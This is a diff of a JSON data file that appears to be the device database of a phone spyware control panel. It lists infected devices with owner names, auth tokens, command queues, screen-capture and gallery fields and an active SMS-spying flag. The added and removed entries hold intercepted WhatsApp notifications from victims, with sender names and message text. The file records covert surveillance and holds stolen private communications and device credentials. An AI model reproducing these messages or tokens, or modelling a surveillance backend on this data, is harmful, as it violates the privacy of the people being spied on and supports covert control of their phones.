@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776779089243,
+    "lastSeen": 1776779128356,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB || RULZ STORE KALBAR (688 pesan): ~ ada",
+        "content": "📷 280+\n\n* max 1 evo 2\n* log ggl bind sepaket\n* sg lobby 2\n* v140 \n\n(MC YANG AKU KENAL/COD SIANTAN)",
+        "time": "21/04 20:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776779129891
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3634 pesan dari 22 chat",
+        "time": "21/04 20:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776779129796
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10312,22 +10328,6 @@
         "time": "21/04 20:19",
         "pkg": "com.whatsapp",
         "receivedAt": 1776777562500
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB byone/mabar ff 8a (77 pesan): Daraa",
-        "content": "ITU UDAH DIKIRIM TU",
-        "time": "21/04 20:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777561672
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3526 pesan dari 22 chat",
-        "time": "21/04 20:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777560059
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776779089696,
+    "lastSeen": 1776779127750,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10389,7 +10389,7 @@
     "token": "e308898150127caeca3b2487066a87c8",
     "lastSeen": 1776776426314,
     "commandQueue": [],
-    "online": true,
+    "online": false,
     "connectedAt": "2026-04-21T10:19:21.483Z",
     "deviceInfo": {
       "model": "realme RMX2103",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776779088831,
+    "lastSeen": 1776779127815,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
